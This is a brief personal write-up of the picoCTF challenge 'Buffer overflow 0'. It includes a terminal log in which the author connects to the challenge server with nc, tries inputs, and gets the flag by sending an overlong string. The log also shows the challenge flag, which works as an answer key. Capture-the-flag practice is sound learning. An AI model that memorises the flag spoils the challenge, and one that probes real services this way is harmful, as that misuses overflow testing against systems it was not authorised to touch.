# Binary exploitation 
## Buffer overflow 0 
So i got very lucky with this one.
The source and the program would not open regardless of what I did. To my computer it simply did not exist. So i played around with the program trying to figure out what it was meant to do.
It would exit regardless of what input i gave. The name of the challenge was buffer overflow 0 so the thought process was "What if my input was just very long" cause there had to be a max limit to the input.
Turns out i was right.
I did look at the write up of this online to check the what the source and program were.
```
(base) Vijayakrishnas-MacBook-Pro:~ avani$ nc saturn.picoctf.net 60023nc saturn.picoctf.net 60023
nc: port range not valid
(base) Vijayakrishnas-MacBook-Pro:~ avani$ nc saturn.picoctf.net 60023
Input: a 
The program will exit now
(base) Vijayakrishnas-MacBook-Pro:~ avani$ nc saturn.picoctf.net 60023
Input: 3
The program will exit now
(base) Vijayakrishnas-MacBook-Pro:~ avani$ nc saturn.picoctf.net 60023
Input: 1kdohuygf73fb930761
The program will exit now
(base) Vijayakrishnas-MacBook-Pro:~ avani$ nc saturn.picoctf.net 60023
Input: 1983712ehniqubdqtwdbq807631dfqeg01 
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```